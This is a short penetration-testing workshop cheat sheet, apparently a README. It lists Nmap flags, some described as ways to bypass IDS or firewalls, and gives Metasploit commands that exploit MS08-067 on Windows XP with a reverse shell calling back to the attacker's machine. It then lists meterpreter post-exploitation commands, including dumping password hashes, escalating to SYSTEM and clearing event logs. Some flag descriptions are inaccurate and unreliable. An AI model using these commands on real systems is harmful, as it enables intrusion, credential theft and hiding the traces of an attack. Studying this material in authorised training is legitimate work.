# PenTesting-Workshop

### Nmap Commands
```
nmap -h                     Displays all the commands for nmap

nmap -iL <inputFileName>    Can scan multiples ip all put inside a file

nmap -v                     Verbose information - Shows all available information

nmap -sV                    Shows all the services which are running on open Ports

nmap -O                     Tries to detect the OS running on the target machine

nmap -f                     Sends fraggmented packets and can bypass IDS

nmap -sT                    Stealh Scan

nmap -sX                    Xmas Scan

nmap -T0,T1,T2,T3,T4,T5     Slow scan in order of speed (slow to fast)

nmap -Pn                    Can be used to bypass weak Firewall
```

   
###System Hacking
<hr>
**Exploiting Windows XP**
```
use exploit/windows/smb/ms08_067_netapi
set PAYLOAD windows/shell/reverse_tcp
set LHOST <Kali IP>
set RHOST <target IP>
exploit

set PAYLOAD windows/meterpreter/reverse_tcp

show options 			shows all the options to be filled
```

**Meterpreter Commands**
```
After getting meterpreter migrate to explorer.exe process 
(Maintaining Access)

?                     (Help menu all commands)
sysinfo               (target info)
getpid                (current running process)
ps                    (list of all process)
migrate <Service ID>  (migrate to other process)
getprivs              (Get the level of access)
screenshot            (screenshot of target)
getsystem             (get the full access)
hashdump              (get password hash)
clearev               (clear the logs)
shell                 (get the command shell)
exit                  (exit a meterpreter session)
```
